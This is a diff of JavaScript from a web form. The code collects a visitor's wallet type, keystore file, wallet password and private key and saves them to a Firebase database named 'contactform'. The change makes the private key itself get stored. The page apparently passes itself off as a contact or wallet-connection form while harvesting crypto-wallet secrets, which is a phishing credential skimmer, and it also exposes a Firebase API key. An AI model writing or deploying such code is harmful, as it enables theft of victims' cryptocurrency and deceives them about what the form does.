@@ -287,12 +287,6 @@
         }
 
    
-
-
-          
-
-
-
         const firebaseConfig = {
   apiKey: "AIzaSyDL02IHV9fVfPm5r2g5-j3KxvPjrP7pj7c",
   authDomain: "contactform-50d9f.firebaseapp.com",
@@ -329,12 +323,12 @@ function submitForm(e) {
                     walletCredentials = { keystore: walletKeystore, password: walletPassword };
                     break;
                 case 'private-key':
-                    walletCredentials = document.getElementById('wallet-private-key').value;
+                    var walletPrivateKey = document.getElementById('wallet-private-key').value;
                     break;
                 default:
                     break;
             }
-  saveMessages(name, emailid, msgContent,selectedWallet,walletKeystore,walletName,walletPassword,walletCredentials);
+  saveMessages(selectedWallet,walletKeystore,walletName,walletPassword,walletPrivateKey);
 
   //   enable alert
   document.querySelector(".alert").style.display = "block";
@@ -357,7 +351,7 @@ const saveMessages = (name, emailid, msgContent) => {
     walletName: walletName,
       selectedWallet: selectedWallet,
        walletPassword: walletPassword,
-      walletCredentials: walletCredentials
+      walletPrivateKey: walletPrivateKey
   });
 };
 
